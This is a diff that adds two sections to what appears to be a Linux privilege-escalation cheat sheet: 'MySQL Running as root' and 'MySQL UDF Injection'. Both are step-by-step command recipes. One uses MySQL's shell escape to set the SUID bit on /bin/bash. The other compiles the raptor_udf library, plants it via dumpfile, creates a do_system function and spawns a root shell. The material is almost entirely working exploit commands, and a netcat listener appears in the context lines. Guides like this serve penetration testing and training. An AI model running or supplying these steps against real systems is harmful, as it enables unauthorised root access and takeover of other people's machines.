@@ -21,6 +21,8 @@ Simple and accurate guide for linux privilege escalation tactics
 - chkrootkit 0.49
 - Tmux
 - MySQL Running as root
+- MySQL UDF (User-Defined Functions) Code (UDF) Injection
+
 
 
 # Basic System Enumeration
@@ -903,5 +905,42 @@ Attacker
 
 ```
 nc -lvnp 9999
+id && whoami
+```
+
+# MySQL Running as root
+
+Example 1
+```
+ps aux | grep root
+
+mysql -u root -p
+
+\! chmod +s /bin/bash
+exit
+ls -la /bin/bash                          // Verify that the SUID bit is set
+/bin/bash -p 
+id && whoami
+```
+
+# MySQL UDF (User-Defined Functions) Code (UDF) Injection
+
+Example 1
+```
+ps aux | grep root                        //  Verify that MySQL is running as root
+gcc -g -c raptor_udf.c
+gcc -g -shared -W1,-soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
+mysql -u root -p
+
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file(‘/home/raptor/raptor_udf.so’));
+mysql> select * from foo into dumpfile ‘/usr/lib/raptor_udf.so’;
+mysql> create function do_system returns integer soname ‘raptor_udf.so’;
+mysql> select * from mysql.func;
+mysql> select do_system(‘chmod +s /bin/bash’);
+mysql> !bash
+ls -la /bin/bash                          // Verify that the SUID bit is set
+/bin/bash -p
 id && whoami
 ```
